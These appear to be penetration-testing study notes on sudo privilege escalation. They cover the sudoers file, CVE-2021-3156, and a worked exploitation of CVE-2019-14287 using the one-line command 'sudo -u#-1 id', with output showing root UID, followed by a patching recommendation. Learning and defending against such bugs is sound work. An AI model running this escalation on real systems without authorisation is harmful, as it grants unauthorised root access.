## Sudo Basics

- **sudo**: runs processes with another user's rights (usually admin/root) on UNIX-like systems.
- Access controlled via **`/etc/sudoers`** — specifies which users/groups can run which commands, and with what privileges.

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

```
Defaults        env_reset
Defaults        secure_path="/usr/local/sbin:...:/bin:/snap/bin"
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

## CVE-2021-3156 — "Baron Samedit" (Heap Buffer Overflow)

- **Heap-based buffer overflow** in sudo, present and undiscovered for **over 10 years**.
- Affected versions (examples):
  - sudo 1.8.31 — Ubuntu 20.04
  - sudo 1.8.27 — Debian 10
  - sudo 1.9.2 — Fedora 33
  - and others


## CVE-2019-14287 — Sudo Policy Bypass (Negative UID)

- Affects **all sudo versions below 1.8.28**.
- **Single prerequisite:** the user must be allowed in `/etc/sudoers` to run **some** command as a specified user (commonly `ALL=(ALL)`).

### Check Sudo Rights

```bash
sudo -l
```

```
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

- `(ALL)` means the user can run the allowed command **as any user ID**, specified via `-u`.

### The Bug

- Sudo allows specifying a **numeric user ID** instead of a username via `-u#<uid>`.
- Supplying **`-1`** (or any value that isn't a valid existing UID) causes sudo to **process it as UID 0** — i.e., root — due to how the ID is cast/interpreted internally.

### Find Your Own UID (for context)

```bash
cat /etc/passwd | grep cry0l1t3
# cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

### Exploit

```bash
sudo -u#-1 id
```

```
root@nix02:/home/cry0l1t3# id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

- Note: **uid=0(root)**, but **gid** remains the original user's group — still counts as a privilege escalation to root UID.

## Key Takeaways

| CVE | Type | Key Requirement | Core Exploit Action |
|---|---|---|---|
| **CVE-2021-3156** | Heap buffer overflow | Vulnerable sudo version (e.g., 1.8.31 on Ubuntu 20.04, etc.) | Run matching PoC binary for the target OS/sudo/libc combo |
| **CVE-2019-14287** | Policy bypass | sudo < 1.8.28 + `ALL=(ALL)` style sudoers entry for some command | `sudo -u#-1 <allowed command>` → UID cast to 0 |

- Always check **`sudo -V`** and `/etc/lsb-release` (or equivalent) early — sudo version directly determines exposure to known CVEs.
- CVE-2021-3156 requires a public PoC matched to the exact target distro/sudo/libc combination — manual mode exists as a fallback for unlisted targets.
- CVE-2019-14287 needs almost no special sudoers configuration — just an `ALL=(ALL)`-style rule for **any** command is enough, making it a very low-bar, high-impact bug on unpatched systems.
- Defense: **keep sudo patched** — both of these are version-specific bugs fully resolved by updating sudo.
